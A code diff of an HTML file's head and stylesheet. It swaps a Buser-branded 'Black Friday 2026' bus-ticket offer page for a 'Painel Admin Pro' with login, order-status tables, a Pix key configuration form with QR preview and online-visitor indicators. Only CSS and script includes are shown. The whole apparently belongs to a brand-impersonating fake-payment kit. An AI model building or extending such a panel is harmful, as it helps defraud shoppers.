@@ -3,1864 +3,980 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Black Friday 2026 com viagens de ônibus em oferta | Buser</title>
-<link rel="preconnect" href="https://bcdn.com.br/" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
-<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<title>Painel Admin Pro | Buser</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap">
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 <style>
-  /* ============================================================
-     DESIGN TOKENS
-     ============================================================ */
-  :root{
-    --brand:#f11075;
-    --brand-dark:#e70869;
-    --brand-light:#ff4d9a;
-    --brand-soft:#fff0f7;
-    --brand-glow:rgba(241,16,117,.3);
+:root{
+  --brand:#f11075; --brand-dark:#e70869; --brand-soft:#fff0f7;
+  --bg-body:#f5f6fa; --bg-card:#ffffff; --bg-header:rgba(255,255,255,.95);
+  --text-main:#1a1a1a; --text-muted:#757575; --border-color:#ebebeb; --hover-bg:#f7f7f7;
+  --green:#40b552; --green-dark:#2e9a3e; --red:#d81b60; --yellow:#f0a500; --blue:#0277bd;
+  --shadow-sm:0 1px 3px rgba(0,0,0,.06); --shadow-md:0 4px 8px -2px rgba(0,0,0,.08);
+  --shadow-lg:0 12px 24px -6px rgba(0,0,0,.12); --shadow-xl:0 24px 48px -12px rgba(0,0,0,.18);
+  --r-sm:8px; --r-md:12px; --r-lg:16px; --r-xl:24px; --r-full:999px;
+}
+body.dark-mode {
+  --bg-body:#121212; --bg-card:#1e1e1e; --bg-header:rgba(30,30,30,.95);
+  --text-main:#f0f0f0; --text-muted:#a0a0a0; --border-color:#333333; --hover-bg:#2a2a2a;
+  --brand-soft:rgba(241,16,117,.15);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{font-family:'Poppins',sans-serif;color:var(--text-main);background:var(--bg-body);-webkit-font-smoothing:antialiased;transition:background 0.3s,color 0.3s}
+button{font-family:inherit;cursor:pointer;border:none}
+input,select{font-family:inherit;outline:none}
 
-    --grey-dark:#1a1a1a;
-    --grey-med:#757575;
-    --grey-light:#ebebeb;
-    --grey-soft:#f7f7f7;
+/* LOGIN */
+#login-screen{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 60%,#8b0045 100%);position:relative;overflow:hidden}
+#login-screen::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 20% 30%,rgba(255,255,255,.15) 0%,transparent 50%),radial-gradient(circle at 80% 70%,rgba(255,255,255,.1) 0%,transparent 40%)}
+.login-card{background:#fff;border-radius:var(--r-xl);padding:48px 40px;width:100%;max-width:420px;box-shadow:var(--shadow-xl);position:relative;z-index:2}
+.login-card .logo-box{width:64px;height:64px;border-radius:var(--r-lg);background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);display:flex;align-items:center;justify-content:center;color:#fff;font-size:28px;margin:0 auto 20px;box-shadow:0 8px 24px -4px rgba(241,16,117,.4)}
+.login-card h1{font-size:24px;text-align:center;margin-bottom:6px;font-weight:700;color:#1a1a1a}
+.login-card p{font-size:13px;color:#757575;text-align:center;margin-bottom:28px}
+.login-card input{width:100%;padding:14px 16px;border:1.5px solid #ebebeb;border-radius:var(--r-md);font-size:15px;transition:0.2s;background:#f7f7f7}
+.login-card input:focus{border-color:var(--brand);background:#fff;box-shadow:0 0 0 3px var(--brand-soft)}
+.login-card button{width:100%;padding:14px;margin-top:16px;border-radius:var(--r-md);background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);color:#fff;font-weight:700;font-size:15px;transition:0.2s;box-shadow:0 8px 24px -4px rgba(241,16,117,.35)}
+.login-card button:hover{transform:translateY(-2px);box-shadow:0 12px 32px -4px rgba(241,16,117,.45)}
+.login-error{color:#d81b60;font-size:13px;margin-top:12px;text-align:center;font-weight:500;min-height:18px}
 
-    --green:#40b552;
-    --green-dark:#2e9a3e;
-    --red:#d81b60;
+/* LAYOUT */
+#admin-panel{display:none;min-height:100vh}
+#admin-panel.active{display:flex;flex-direction:column}
+.admin-header{position:sticky;top:0;z-index:50;background:var(--bg-header);backdrop-filter:blur(16px);border-bottom:1px solid var(--border-color);height:64px;display:flex;align-items:center;padding:0 24px;gap:16px}
+.admin-header .brand-logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
+.admin-header .brand-logo .dot{width:32px;height:32px;border-radius:var(--r-sm);background:linear-gradient(135deg,var(--brand),var(--brand-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;box-shadow:0 4px 10px -2px rgba(241,16,117,.4)}
+.admin-header .spacer{flex:1}
+.admin-header .icon-btn{width:40px;height:40px;border-radius:var(--r-md);background:var(--hover-bg);display:flex;align-items:center;justify-content:center;font-size:16px;color:var(--text-main);transition:0.2s}
+.admin-header .icon-btn:hover{background:var(--brand-soft);color:var(--brand)}
+.admin-header .logout-btn{padding:8px 16px;border-radius:var(--r-md);background:var(--hover-bg);font-weight:600;font-size:13px;color:var(--text-main);transition:0.2s}
+.admin-header .logout-btn:hover{background:#ffe0e5;color:#d81b60}
+.admin-layout{display:flex;flex:1;min-height:calc(100vh - 64px)}
 
-    --shadow-xs:0 1px 2px rgba(0,0,0,.05);
-    --shadow-sm:0 1px 2px rgba(0,0,0,.04),0 1px 3px rgba(0,0,0,.06);
-    --shadow-md:0 4px 8px -2px rgba(0,0,0,.06),0 2px 4px -2px rgba(0,0,0,.04);
-    --shadow-lg:0 12px 24px -6px rgba(0,0,0,.1),0 4px 8px -4px rgba(0,0,0,.05);
-    --shadow-xl:0 24px 48px -12px rgba(0,0,0,.15);
-    --shadow-brand:0 8px 24px -4px rgba(241,16,117,.35);
-    --shadow-brand-hover:0 12px 32px -4px rgba(241,16,117,.45);
+/* SIDEBAR */
+.admin-sidebar{width:250px;background:var(--bg-card);border-right:1px solid var(--border-color);padding:24px 16px;flex-shrink:0;position:sticky;top:64px;height:calc(100vh - 64px);overflow-y:auto}
+.nav-item{display:flex;align-items:center;gap:12px;padding:12px 16px;border-radius:var(--r-md);color:var(--text-muted);font-weight:500;font-size:14px;transition:0.2s;margin-bottom:4px;cursor:pointer;background:transparent;width:100%;text-align:left}
+.nav-item i{font-style:normal;font-size:18px;width:22px;text-align:center}
+.nav-item:hover{background:var(--hover-bg);color:var(--text-main)}
+.nav-item.active{background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);color:#fff;box-shadow:0 4px 12px -4px rgba(241,16,117,.4)}
+.nav-item .nav-badge{margin-left:auto;background:var(--hover-bg);color:var(--text-main);padding:2px 8px;border-radius:var(--r-full);font-size:11px;font-weight:700}
+.nav-item.active .nav-badge{background:rgba(255,255,255,.25);color:#fff}
 
-    --r-sm:8px;
-    --r-md:12px;
-    --r-lg:16px;
-    --r-xl:24px;
-    --r-2xl:32px;
-    --r-full:999px;
+/* MAIN */
+.admin-main{flex:1;padding:32px;overflow-x:hidden}
+.section{display:none;animation:fadeIn .3s ease}
+.section.active{display:block}
+.section-header{margin-bottom:28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.section-header h1{font-size:26px;font-weight:700;color:var(--text-main)}
+.section-header p{font-size:13px;color:var(--text-muted);margin-top:4px}
 
-    --ease:cubic-bezier(.4,0,.2,1);
-    --t-fast:all .15s var(--ease);
-    --t:all .22s var(--ease);
-    --t-slow:all .35s var(--ease);
+/* STATS */
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:20px}
+@media(max-width:1100px){.stats-grid{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:600px){.stats-grid{grid-template-columns:1fr}}
+.stat-card{background:var(--bg-card);border-radius:var(--r-lg);padding:24px;border:1px solid var(--border-color);transition:0.2s;position:relative;overflow:hidden;box-shadow:var(--shadow-sm)}
+.stat-card:hover{transform:translateY(-2px);box-shadow:var(--shadow-md)}
+.stat-card .sc-icon{width:48px;height:48px;border-radius:var(--r-md);display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:14px}
+.stat-card .sc-label{font-size:12px;color:var(--text-muted);font-weight:600;text-transform:uppercase;letter-spacing:.04em;margin-bottom:6px}
+.stat-card .sc-value{font-size:28px;font-weight:800;color:var(--text-main);line-height:1.1}
+.stat-card .sc-meta{font-size:11px;color:var(--text-muted);margin-top:6px}
+.stat-card.pink .sc-icon{background:var(--brand-soft);color:var(--brand)} .stat-card.pink .sc-value{color:var(--brand)}
+.stat-card.green .sc-icon{background:rgba(64,181,82,.15);color:var(--green)} .stat-card.green .sc-value{color:var(--green-dark)}
+.stat-card.yellow .sc-icon{background:rgba(240,165,0,.15);color:var(--yellow)} .stat-card.yellow .sc-value{color:#b87d00}
+.stat-card.blue .sc-icon{background:rgba(2,119,189,.15);color:var(--blue)} .stat-card.blue .sc-value{color:var(--blue)}
 
-    --safe-top:env(safe-area-inset-top,0px);
-    --safe-bottom:env(safe-area-inset-bottom,0px);
-  }
+/* SUB STATS (MINI CARDS) */
+.sub-stats{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:28px}
+.sub-stat-card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--r-md);padding:16px 20px;display:flex;justify-content:space-between;align-items:center}
+.sub-stat-card span{font-size:13px;color:var(--text-muted);font-weight:500}
+.sub-stat-card strong{font-size:18px;color:var(--text-main)}
 
-  *{box-sizing:border-box}
-  html,body{margin:0;padding:0;font-family:'Poppins',sans-serif;color:var(--grey-dark);background:#fff;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
-  a{text-decoration:none;color:inherit}
-  ul{list-style:none;margin:0;padding:0}
-  button{font-family:inherit}
-  .container{max-width:1200px;margin:0 auto;padding:0 16px;width:100%}
+/* CARDS & TABLES */
+.card{background:var(--bg-card);border-radius:var(--r-lg);border:1px solid var(--border-color);padding:24px;box-shadow:var(--shadow-sm);margin-bottom:20px}
+.card h2{font-size:16px;font-weight:600;margin-bottom:16px;color:var(--text-main)}
+.table-responsive{overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:12px;border-bottom:2px solid var(--border-color);color:var(--text-muted);font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.04em}
+td{padding:12px;border-bottom:1px solid var(--border-color);vertical-align:middle}
+tr:hover td{background:var(--hover-bg)}
+.status-badge{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:var(--r-full);font-size:11px;font-weight:700}
+.status-badge::before{content:'';width:6px;height:6px;border-radius:50%;background:currentColor}
+.status-badge.pending{background:rgba(240,165,0,.15);color:#b87d00}
+.status-badge.paid{background:rgba(64,181,82,.15);color:var(--green-dark)}
+.status-badge.cancelled{background:rgba(216,27,96,.15);color:var(--red)}
+.btn-action{padding:6px 12px;border-radius:var(--r-md);font-size:11px;font-weight:600;transition:0.2s;display:inline-flex;align-items:center;gap:4px;border:none;cursor:pointer}
+.btn-confirm{background:rgba(64,181,82,.15);color:var(--green-dark)} .btn-confirm:hover{background:var(--green);color:#fff}
+.btn-cancel{background:rgba(216,27,96,.15);color:var(--red)} .btn-cancel:hover{background:var(--red);color:#fff}
+.btn-view{background:var(--hover-bg);color:var(--text-main)} .btn-view:hover{background:var(--brand-soft);color:var(--brand)}
 
-  /* ============================================================
-     TASKBAR
-     ============================================================ */
-  .taskbar{
-    position:fixed;top:0;left:0;right:0;z-index:35;
-    height:calc(60px + var(--safe-top));padding-top:var(--safe-top);
-    background:rgba(255,255,255,.85);
-    backdrop-filter:saturate(180%) blur(16px);
-    -webkit-backdrop-filter:saturate(180%) blur(16px);
-    box-shadow:0 1px 0 rgba(0,0,0,.06),0 4px 12px -8px rgba(0,0,0,.1);
-  }
-  .taskbar .t-content{align-items:center;display:flex;height:100%;justify-content:space-between}
-  .taskbar-desktop{display:flex;align-items:center;justify-content:space-between;flex-grow:1;height:100%;max-width:100%}
-  .logo{width:122px;height:24px;color:var(--brand);fill:var(--brand);flex-shrink:0;display:block;transition:var(--t)}
-  .logo:hover{transform:scale(1.03)}
-  .menu-links{display:flex;gap:4px;align-items:center}
-  .menu-links .ml-item{
-    color:var(--grey-dark);font-weight:500;padding:8px 16px;
-    border-radius:var(--r-full);transition:var(--t);font-size:14px;cursor:pointer;
-  }
-  .menu-links .ml-item:hover{background:var(--brand-soft);color:var(--brand)}
-  .avatar{
-    width:36px;height:36px;border-radius:50%;
-    background-image:url('https://bcdn.com.br/_nuxt3/avatar.fWv4A4-_.webp');
-    background-size:cover;background-color:#e0e0e0;cursor:pointer;
-    margin-left:8px;transition:var(--t);
-    box-shadow:0 0 0 2px #fff,0 0 0 4px var(--grey-light);
-  }
-  .avatar:hover{box-shadow:0 0 0 2px #fff,0 0 0 4px var(--brand)}
-  .taskbar-mobile{display:none;width:100%;justify-content:center}
-  @media (max-width:767px){
-    .taskbar-desktop{display:none}
-    .taskbar-mobile{display:flex;align-items:center;justify-content:center}
-  }
+/* FILTROS */
+.filters-row{display:flex;gap:12px;margin-bottom:20px;flex-wrap:wrap;align-items:center}
+.filters-row input, .filters-row select{padding:11px 14px;border:1.5px solid var(--border-color);border-radius:var(--r-md);font-size:14px;background:var(--bg-card);color:var(--text-main);transition:0.2s}
+.filters-row input:focus, .filters-row select:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-soft)}
+.filters-row input[type="text"]{flex:1;min-width:200px}
+.filters-row input[type="date"]{color:var(--text-muted)}
+.btn-export{padding:11px 18px;background:var(--green);color:#fff;border-radius:var(--r-md);font-weight:600;font-size:13px;transition:0.2s;display:inline-flex;align-items:center;gap:6px}
+.btn-export:hover{background:var(--green-dark);transform:translateY(-1px)}
 
-  /* ============================================================
-     HEADER / HERO
-     ============================================================ */
-  .header{
-    padding-top:calc(60px + var(--safe-top));
-    position:relative;background:var(--brand);overflow:hidden;
-  }
-  .header-bg{
-    position:absolute;inset:0;
-    background:url('https://bcdn.com.br/_nuxt3/foto-busao-rosa.B2KzL8f9.png') center/cover no-repeat;
-    opacity:.35;transform:scale(1.05);
-  }
-  .header-gradient{
-    position:absolute;inset:0;
-    background:
-      radial-gradient(ellipse at 20% 0%,rgba(255,77,154,.7) 0%,transparent 55%),
-      linear-gradient(180deg,rgba(241,16,117,.97) 0%,rgba(231,8,105,.85) 45%,rgba(255,255,255,.98) 100%);
-  }
-  .header .h-container{
-    display:flex;flex-direction:column;align-items:center;gap:16px;
-    position:relative;z-index:2;padding-bottom:56px;
-  }
+/* DASHBOARD GRIDS */
+.charts-grid{display:grid;grid-template-columns:2fr 1fr;gap:20px;margin-bottom:20px}
+@media(max-width:1000px){.charts-grid{grid-template-columns:1fr}}
+.chart-container{position:relative;height:300px;width:100%;display:flex;align-items:center;justify-content:center}
+.pie-container{height:250px;width:250px;margin:0 auto}
 
-  /* Frase hero */
-  .header-hero-text{
-    width:100%;
-    max-width:780px;
-    margin:72px auto 0;
-    padding-inline:16px;
-    text-align:center;
-    position:relative;
-    z-index:3;
-  }
-  .header-tagline{
-    color:#fff;
-    font-size:clamp(26px, 4.2vw, 44px);
-    font-weight:700;
-    line-height:1.15;
-    margin:0 0 12px;
-    letter-spacing:-.02em;
-    text-shadow:0 2px 12px rgba(0,0,0,.15);
-  }
-  .header-tagline .tagline-accent{
-    background:linear-gradient(180deg,#fff 0%,#ffe0ee 100%);
-    -webkit-background-clip:text;
-    background-clip:text;
-    -webkit-text-fill-color:transparent;
-    color:transparent;
-  }
-  .header-subtitle{
-    color:#fff;
-    font-size:clamp(13px, 1.5vw, 16px);
-    font-weight:500;
-    margin:0;
-    opacity:.95;
-    line-height:1.5;
-    text-shadow:0 1px 4px rgba(0,0,0,.15);
-  }
-  .header-subtitle strong{
-    background:rgba(255,255,255,.2);
-    padding:2px 8px;
-    border-radius:var(--r-full);
-    font-weight:700;
-    backdrop-filter:blur(4px);
-    white-space:nowrap;
-  }
+/* PIX CONFIG */
+.pix-form{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:700px){.pix-form{grid-template-columns:1fr}}
+.form-group{display:flex;flex-direction:column;gap:6px}
+.form-group.full{grid-column:1/-1}
+.form-group label{font-size:12px;font-weight:600;color:var(--text-muted);text-transform:uppercase}
+.form-group input{padding:12px 14px;border:1.5px solid var(--border-color);border-radius:var(--r-md);font-size:14px;transition:0.2s;background:var(--bg-card);color:var(--text-main)}
+.form-group input:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-soft)}
+.btn-primary{padding:13px 24px;border-radius:var(--r-md);background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);color:#fff;font-weight:700;font-size:14px;transition:0.2s;box-shadow:0 8px 24px -4px rgba(241,16,117,.35)}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px -4px rgba(241,16,117,.45)}
+.pix-preview{background:var(--hover-bg);border-radius:var(--r-md);padding:20px;margin-top:20px;display:none;align-items:center;gap:20px;flex-wrap:wrap}
+.pix-preview .qr-box{background:#fff;padding:10px;border-radius:var(--r-md);border:1px solid var(--border-color)}
 
-  /* Search box */
-  .searchbox-wrapper{width:100%;position:relative;z-index:50;padding-inline:16px;margin-top:32px}
-  .searchbox-card{
-    background:#fff;border-radius:var(--r-xl);padding:8px;
-    display:flex;gap:4px;align-items:center;flex-wrap:wrap;
-    box-shadow:0 12px 40px -8px rgba(0,0,0,.2),0 4px 12px -4px rgba(0,0,0,.1);
-    position:relative;
-    border:1px solid rgba(255,255,255,.6);
-  }
-  .searchbox-field{
-    flex:1;min-width:160px;height:74px;
-    display:flex;flex-direction:column;justify-content:center;
-    padding:0 16px;border-right:1px solid var(--grey-light);
-    position:relative;border-radius:var(--r-md);transition:var(--t);
-  }
-  .searchbox-field:focus-within{background:var(--brand-soft)}
-  .searchbox-field:last-of-type,
-  .searchbox-field:nth-of-type(3){border-right:none}
-  .searchbox-field label{
-    font-size:11px;color:var(--grey-med);font-weight:600;
-    margin-bottom:4px;cursor:pointer;letter-spacing:.02em;
-    text-transform:uppercase;
-  }
-  .searchbox-field input{
-    border:none;outline:none;font-size:15px;
-    font-family:'Poppins',sans-serif;color:var(--grey-dark);
-    width:100%;background:transparent;font-weight:600;
-  }
-  .searchbox-field input::placeholder{font-weight:400;color:#999}
-  .swap-btn{
-    background:#fff;border:1px solid var(--grey-light);border-radius:50%;
-    width:34px;height:34px;display:flex;align-items:center;justify-content:center;
-    cursor:pointer;position:absolute;left:33%;top:50%;
-    transform:translate(-50%,-50%);z-index:10;color:var(--brand);
-    box-shadow:var(--shadow-sm);transition:var(--t);
-  }
-  .swap-btn:hover{transform:translate(-50%,-50%) rotate(180deg);box-shadow:var(--shadow-md);border-color:var(--brand)}
+/* MODAL */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);z-index:9000;display:none;align-items:center;justify-content:center;padding:20px}
+.modal-overlay.active{display:flex;animation:fadeIn .2s ease}
+.modal-content{background:var(--bg-card);border-radius:var(--r-lg);max-width:600px;width:100%;max-height:90vh;overflow-y:auto;box-shadow:var(--shadow-xl);animation:slideUp .3s ease;color:var(--text-main)}
+.modal-content .modal-head{padding:20px 24px;border-bottom:1px solid var(--border-color);display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;background:var(--bg-card);z-index:2}
+.modal-content .modal-head h2{font-size:17px;margin:0}
+.modal-content .modal-head button{width:32px;height:32px;border-radius:50%;background:var(--hover-bg);font-size:16px;color:var(--text-muted);transition:0.2s}
+.modal-content .modal-head button:hover{background:#ffe0e5;color:var(--red)}
+.modal-content .modal-body{padding:24px}
+.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px dashed var(--border-color);font-size:13px}
+.detail-row:last-child{border-bottom:none}
+.detail-row span{color:var(--text-muted)} .detail-row strong{color:var(--text-main);text-align:right;max-width:60%}
 
-  /* Botão de busca - pill com ícone SVG + texto */
-  .searchbox-btn{
-    background:linear-gradient(135deg,var(--brand) 0%,var(--brand-dark) 100%);
-    color:#fff;border:none;height:58px;
-    padding:0 28px;border-radius:var(--r-full);
-    display:inline-flex;align-items:center;justify-content:center;gap:10px;
-    cursor:pointer;margin:0 8px 0 4px;font-size:15px;font-weight:700;
-    font-family:'Poppins',sans-serif;letter-spacing:.01em;
-    flex-shrink:0;min-width:130px;
-    transition:var(--t);box-shadow:var(--shadow-brand);
-    position:relative;overflow:hidden;
-  }
-  .searchbox-btn::before{
-    content:'';position:absolute;inset:0;
-    background:linear-gradient(135deg,transparent 0%,rgba(255,255,255,.2) 50%,transparent 100%);
-    transform:translateX(-100%);
-    transition:transform .6s var(--ease);
-  }
-  .searchbox-btn:hover::before{transform:translateX(100%)}
-  .searchbox-btn:hover{transform:translateY(-1px);box-shadow:var(--shadow-brand-hover)}
-  .searchbox-btn:active{transform:scale(.97)}
-  .searchbox-btn svg{flex-shrink:0;transition:transform .3s var(--ease)}
-  .searchbox-btn:hover svg{transform:scale(1.1) rotate(-8deg)}
+/* TOAST & MISC */
+.toast-container{position:fixed;top:80px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.toast{background:var(--bg-card);border-radius:var(--r-md);padding:14px 18px;box-shadow:var(--shadow-lg);border-left:4px solid var(--brand);font-size:13px;font-weight:500;min-width:280px;animation:slideInRight .3s ease;color:var(--text-main)}
+.toast.success{border-color:var(--green)} .toast.error{border-color:var(--red)}
+@keyframes slideInRight{from{transform:translateX(120%);opacity:0}to{transform:translateX(0);opacity:1}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.v-dot{width:10px;height:10px;border-radius:50%;background:var(--text-muted);flex-shrink:0;display:inline-block}
+.v-dot.online{background:var(--green);box-shadow:0 0 0 3px rgba(64,181,82,.2);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 
-  .hcb-vantagens{
-    display:flex;gap:32px;justify-content:center;
-    height:16px;width:100%;font-size:12px;color:#fff;
-    margin-top:16px;position:relative;z-index:2;
-    text-shadow:0 1px 2px rgba(0,0,0,.25);font-weight:500;
-  }
+@media(max-width:900px){
+  .admin-sidebar{position:fixed;left:-260px;top:64px;bottom:0;z-index:40;transition:left .3s ease;box-shadow:var(--shadow-xl)}
+  .admin-sidebar.open{left:0}
+  .admin-main{padding:20px}
+  .section-header h1{font-size:20px}
+  .menu-toggle-btn{display:flex !important}
+}
+.menu-toggle-btn{display:none;width:40px;height:40px;border-radius:var(--r-md);background:var(--hover-bg);align-items:center;justify-content:center;font-size:18px;color:var(--text-main)}
 
-  /* Autocomplete */
-  .autocomplete-dropdown{
-    position:absolute;top:100%;left:0;right:0;background:#fff;
-    border:1px solid var(--grey-light);border-radius:var(--r-md);
-    margin-top:8px;box-shadow:var(--shadow-lg);
-    z-index:100;max-height:250px;overflow-y:auto;display:none;
-  }
-  .autocomplete-dropdown li{
-    padding:12px 16px;cursor:pointer;font-size:14px;
-    border-bottom:1px solid #f0f0f0;transition:var(--t-fast);
-  }
-  .autocomplete-dropdown li:last-child{border-bottom:none}
-  .autocomplete-dropdown li:hover{background:var(--brand-soft);color:var(--brand);font-weight:500}
-
-  /* ============================================================
-     RESULTADOS / TRIP CARDS
-     ============================================================ */
-  #resultados-viagem{
-    display:none;margin-top:40px;padding:24px;background:#fff;
-    border-radius:var(--r-lg);box-shadow:var(--shadow-lg);
-    border:1px solid var(--grey-light);
-  }
-  #resultados-viagem h2{
-    font-size:20px;margin:0 0 20px;color:var(--brand);
-    border-bottom:2px solid var(--brand);padding-bottom:10px;
-    display:inline-block;font-weight:600;
-  }
-  .trip-card{
-    border:1px solid var(--grey-light);border-radius:var(--r-md);
-    padding:20px 24px;margin-bottom:14px;
-    display:flex;justify-content:space-between;align-items:center;
-    background:#fff;gap:16px;
-    transition:var(--t);
-    box-shadow:var(--shadow-xs);
-  }
-  .trip-card:hover{
-    border-color:var(--brand);
-    box-shadow:var(--shadow-md);
-    transform:translateY(-2px);
-  }
-  .trip-info h4{margin:0 0 4px;font-size:18px;color:var(--grey-dark)}
-  .trip-price{
-    font-size:24px;font-weight:700;color:var(--brand);
-    text-align:right;flex-shrink:0;
-  }
-  .preco-antigo{text-decoration:line-through;color:#999;font-size:14px;font-weight:400}
-  .desconto-badge{
-    display:inline-block;
-    background:linear-gradient(135deg,var(--green) 0%,var(--green-dark) 100%);
-    color:#fff;padding:3px 8px;border-radius:6px;
-    font-size:11px;font-weight:700;margin-left:6px;
-    letter-spacing:.02em;box-shadow:0 2px 6px rgba(64,181,82,.3);
-  }
-  .terminal-address{
-    display:block;font-size:11px;color:#888;margin-top:6px;line-height:1.4;
-    background:var(--grey-soft);padding:6px 10px;border-radius:6px;
-    border-left:3px solid var(--brand);
-  }
-  .terminal-address i{color:var(--brand);font-style:normal;margin-right:4px}
-  .company-logo{
-    height:28px;max-width:90px;object-fit:contain;background:#fff;
-    padding:2px 4px;border-radius:6px;border:1px solid #eee;
-  }
-
-  /* ============================================================
-     CARROSSEL DE CUPONS
-     ============================================================ */
-  .cupons-carrossel{margin-top:56px}
-  .carousel ul{
-    display:grid;gap:16px;grid-auto-flow:column;
-    grid-auto-columns:calc(100%/3 - 16px);
-    overflow-x:auto;padding:4px 16px 12px;
-    scrollbar-width:none;scroll-snap-type:x mandatory;
-  }
-  .carousel ul::-webkit-scrollbar{display:none}
-  @media (max-width:767px){.carousel ul{grid-auto-columns:88%}}
-  .cupom-img{
-    width:100%;border-radius:var(--r-lg);object-fit:cover;
-    aspect-ratio:366/183;cursor:pointer;
-    transition:var(--t-slow);box-shadow:var(--shadow-sm);
-  }
-  .cupom-img:hover{transform:scale(1.02);box-shadow:var(--shadow-lg)}
-
-  /* ============================================================
-     VALORES BUSER
-     ============================================================ */
-  .valores-buser{
-    margin-top:64px;padding-top:48px;
-    background:linear-gradient(180deg,var(--brand-soft) 0%,#fafafa 100%);
-    padding-bottom:48px;border-radius:var(--r-xl);
-  }
-  .vb-head{text-align:center;margin-bottom:36px;padding-inline:24px}
-  .vb-head p{color:var(--grey-med);font-size:14px;font-weight:500;margin:0}
-  .vb-head h2{font-size:32px;font-weight:700;margin:8px 0 0;color:var(--brand)}
-  .vb-cards{display:grid;gap:20px;grid-template-columns:repeat(3,1fr);padding:0 24px}
-  @media (max-width:1023px){.vb-cards{grid-template-columns:repeat(2,1fr)}}
-  @media (max-width:767px){.vb-cards{grid-template-columns:1fr}}
-  .vb-card{
-    background:#fff;border:1px solid rgba(0,0,0,.04);
-    border-radius:var(--r-lg);padding:32px;
-    display:flex;flex-direction:column;gap:16px;
-    box-shadow:var(--shadow-sm);transition:var(--t);
-  }
-  .vb-card:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg);border-color:var(--brand-soft)}
-  .vb-card .icon-circle{
-    width:64px;height:64px;border-radius:50%;
-    background:linear-gradient(135deg,var(--brand-soft) 0%,#ffe0ee 100%);
-    display:flex;align-items:center;justify-content:center;font-size:26px;
-    box-shadow:0 4px 12px rgba(241,16,117,.12);
-  }
-  .vb-card h3{margin:0;font-size:20px;font-weight:600;color:var(--brand)}
-  .vb-card p{margin:0;font-size:14px;line-height:1.55;color:var(--grey-med)}
-
-  /* ============================================================
-     NA MÍDIA
-     ============================================================ */
-  .midia-section{
-    display:flex;flex-direction:column;gap:24px;
-    overflow:hidden;margin-top:72px;position:relative;padding-block:24px;
-  }
-  @media (min-width:768px){.midia-section{align-items:center;flex-direction:row;padding-block:40px}}
-  .ms-content{min-width:min(334px,30%);z-index:2}
-  .ms-content p:first-child{color:var(--brand);font-weight:600;margin:0;font-size:13px;letter-spacing:.04em;text-transform:uppercase}
-  .ms-content h2{font-size:32px;color:var(--grey-dark);margin:8px 0 16px;line-height:1.2}
-  .ms-content p{margin:0 0 16px;color:var(--grey-med);line-height:1.5}
-  .ms-content a{color:var(--brand);font-weight:600;border-bottom:2px solid transparent;transition:var(--t)}
-  .ms-content a:hover{border-color:var(--brand)}
-  .ms-items{display:grid;gap:20px;position:relative;z-index:1;width:100%}
-  @media (min-width:768px){.ms-items{grid-template-columns:1fr 1fr;padding-inline:40px}}
-  .ms-item{
-    border:1px solid var(--grey-light);border-radius:var(--r-lg);padding:24px;
-    display:flex;flex-direction:column;justify-content:space-between;
-    background:#fff;gap:16px;box-shadow:var(--shadow-sm);
-    cursor:pointer;transition:var(--t);
-  }
-  .ms-item:hover{transform:translateY(-3px);box-shadow:var(--shadow-lg);border-color:var(--brand-soft)}
-  .ms-item h3{font-size:15px;margin:0;line-height:1.4;color:var(--grey-dark)}
-  .ms-item img{width:90px;height:auto;margin-bottom:8px}
-  .ms-item p{margin:6px 0 0;font-size:12px;color:var(--grey-med)}
-  .ms-background{
-    position:absolute;bottom:0;left:0;right:0;max-height:400px;
-    border-radius:var(--r-lg);overflow:hidden;z-index:0;opacity:.9;
-  }
-  @media (min-width:768px){.ms-background{max-width:min(660px,55vw);bottom:unset;left:unset;right:24px}}
